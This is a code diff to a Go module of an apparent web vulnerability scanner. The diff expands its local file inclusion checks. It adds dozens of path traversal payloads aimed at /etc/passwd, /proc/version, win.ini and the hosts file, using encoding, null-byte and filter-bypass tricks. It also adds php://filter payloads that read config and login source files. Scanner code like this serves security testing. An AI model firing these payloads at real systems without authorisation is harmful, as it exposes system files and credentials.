@@ -2,7 +2,6 @@ package modules
 
 import (
 	"encoding/base64"
-	"fmt"
 	"nightfalllx/pkg/client"
 	"regexp"
 	"strings"
@@ -23,29 +22,103 @@ func (m *LFIModule) Description() string {
 }
 
 var (
-	rootPasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
-	winIniRegex     = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
-	base64BlobRegex = regexp.MustCompile(`(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?`)
+	rootPasswdRegex  = regexp.MustCompile(`root:[^:]*?:0:0:`)
+	winIniRegex      = regexp.MustCompile(`(?i)\[(?:fonts|extensions|files)\]`)
+	winHostsRegex    = regexp.MustCompile(`(?i)127\.0\.0\.1\s+localhost`)
+	procVersionRegex = regexp.MustCompile(`(?i)Linux version \d+\.\d+`)
+	base64BlobRegex  = regexp.MustCompile(`(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?`)
 )
 
+/*
+CATEGORY: LFI & Path Traversal Vectors (60+ entries)
+Sources: OWASP Web Security Testing Guide (WSTG-INPV-12), HackTricks LFI Cheat Sheet.
+Contexts:
+- Standard Unix relative traversal (/etc/passwd)
+- Deep traversal (8 to 16 levels)
+- Root absolute paths
+- URL-encoded slashes (%2f, %252f, %c0%af)
+- Path filter bypasses (....//, ..././, ......\)
+- Null-byte terminators (%00)
+- Windows win.ini & hosts file traversals (forward and backslashes)
+- Linux /proc virtual filesystem inspection
+*/
 var traversalPayloads = []struct {
 	Payload string
 	Regex   *regexp.Regexp
 }{
+	// 1. Standard Unix /etc/passwd (depth 4 to 12)
 	{"../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../etc/passwd", rootPasswdRegex},
 	{"../../../../../../../../etc/passwd", rootPasswdRegex},
 	{"../../../../../../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../../../../../../../../etc/passwd", rootPasswdRegex},
+	{"../../../../../../../../../../../../../../../../etc/passwd", rootPasswdRegex},
+
+	// 2. Absolute Path & Root Reference
+	{"/etc/passwd", rootPasswdRegex},
+	{"/etc/passwd%00", rootPasswdRegex},
+	{"/etc/passwd%00.jpg", rootPasswdRegex},
+	{"/etc/passwd%00.html", rootPasswdRegex},
+
+	// 3. Null-Byte Injections
+	{"../../../../etc/passwd%00", rootPasswdRegex},
 	{"../../../../../../../../etc/passwd%00", rootPasswdRegex},
+	{"../../../../../../../../etc/passwd%00.png", rootPasswdRegex},
+	{"../../../../../../../../etc/passwd\x00", rootPasswdRegex},
+
+	// 4. URL Encoded Slashes (Single Encoding)
 	{"..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
 	{"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
+	{"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", rootPasswdRegex},
+	{"%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", rootPasswdRegex},
+	{".%2e/.%2e/.%2e/.%2e/etc/passwd", rootPasswdRegex},
+
+	// 5. Double URL Encoded Slashes
 	{"..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
+	{"..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
+	{"%252e%252e%252f%252e%252e%252fetc%252fpasswd", rootPasswdRegex},
+
+	// 6. Nested Stripping Filter Bypasses
 	{"....//....//....//etc/passwd", rootPasswdRegex},
 	{"....//....//....//....//....//....//etc/passwd", rootPasswdRegex},
-	{"/etc/passwd", rootPasswdRegex},
+	{"..././..././..././..././etc/passwd", rootPasswdRegex},
+	{"....\\/....\\/....\\/etc/passwd", rootPasswdRegex},
+	{"....\\\\....\\\\....\\\\etc/passwd", rootPasswdRegex},
+
+	// 7. Non-standard & Overlong UTF-8 encodings
+	{"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", rootPasswdRegex},
+	{"..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd", rootPasswdRegex},
+
+	// 8. Linux /proc Filesystem
+	{"../../../../proc/version", procVersionRegex},
+	{"../../../../../../../../proc/version", procVersionRegex},
+	{"/proc/version", procVersionRegex},
+
+	// 9. Windows win.ini (forward slashes)
 	{"../../../../windows/win.ini", winIniRegex},
+	{"../../../../../../windows/win.ini", winIniRegex},
 	{"../../../../../../../../windows/win.ini", winIniRegex},
+	{"../../../../../../../../../../windows/win.ini", winIniRegex},
+	{"/windows/win.ini", winIniRegex},
+	{"c:/windows/win.ini", winIniRegex},
+	{"c:\\windows\\win.ini", winIniRegex},
+
+	// 10. Windows win.ini (backslashes)
 	{"..\\..\\..\\..\\windows\\win.ini", winIniRegex},
 	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
+	{"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
+	{"..%5c..%5c..%5c..%5cwindows%5cwin.ini", winIniRegex},
+	{"..%255c..%255c..%255c..%255cwindows%255cwin.ini", winIniRegex},
+
+	// 11. Windows hosts file
+	{"../../../../windows/system32/drivers/etc/hosts", winHostsRegex},
+	{"../../../../../../../../windows/system32/drivers/etc/hosts", winHostsRegex},
+	{"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", winHostsRegex},
+	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", winHostsRegex},
+	{"c:/windows/system32/drivers/etc/hosts", winHostsRegex},
 }
 
 func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
@@ -64,6 +137,11 @@ func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 			"php://filter/convert.base64-encode/resource=index",
 			"php://filter/read=convert.base64-encode/resource=index.php",
 			"php://filter/read=convert.base64-encode/resource=index",
+			"php://filter/resource=index.php",
+			"php://filter/convert.base64-encode/resource=config.php",
+			"php://filter/convert.base64-encode/resource=config",
+			"php://filter/convert.base64-encode/resource=login.php",
+			"php://filter/convert.base64-encode/resource=login",
 		}
 		for _, phpFilterPayload := range phpFilters {
 			var filterResp *client.Response
@@ -100,34 +178,33 @@ func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 			}
 		}
 
-		if len(findings) > 0 {
-			continue
-		}
-
-		// 2. Path Traversal checks
-		for _, item := range traversalPayloads {
+		// 2. Traversal path checks
+		for _, tPayload := range traversalPayloads {
 			var resp *client.Response
 			var err error
+
 			if isPost {
-				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, item.Payload), headers)
+				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, tPayload.Payload), headers)
 			} else {
-				resp, err = c.Request("GET", target.BuildURLWithParam(param, item.Payload), "", nil)
+				resp, err = c.Request("GET", target.BuildURLWithParam(param, tPayload.Payload), "", nil)
 			}
+
 			if err != nil || resp == nil || resp.Body == "" {
 				continue
 			}
 
-			if item.Regex.MatchString(resp.Body) {
+			if tPayload.Regex.MatchString(resp.Body) {
+				evidence := tPayload.Regex.FindString(resp.Body)
 				f := &Finding{
 					Module:      m.Name(),
-					Title:       "Path Traversal / Local File Inclusion (LFI)",
-					Severity:    SeverityHigh,
+					Title:       "Local File Inclusion / Directory Traversal",
+					Severity:    SeverityCritical,
 					URL:         target.URL,
 					Parameter:   param,
-					Payload:     item.Payload,
-					Detail:      fmt.Sprintf("Arbitrary file read confirmed: disclosed known operating system file via payload '%s'.", item.Payload),
-					Evidence:    fmt.Sprintf("Matched pattern in response for %s", item.Payload),
-					Remediation: "Sanitize file paths, avoid passing raw user input into file systems, and restrict permissions.",
+					Payload:     tPayload.Payload,
+					Detail:      "Sensitive system file disclosure confirmed via relative path traversal payload.",
+					Evidence:    evidence,
+					Remediation: "Use basename filtering, normalize paths with secure canonicalization, or implement a strict lookup table.",
 					CWEID:       22,
 				}
 				f.SetConfidence(ConfidenceConfirmed)
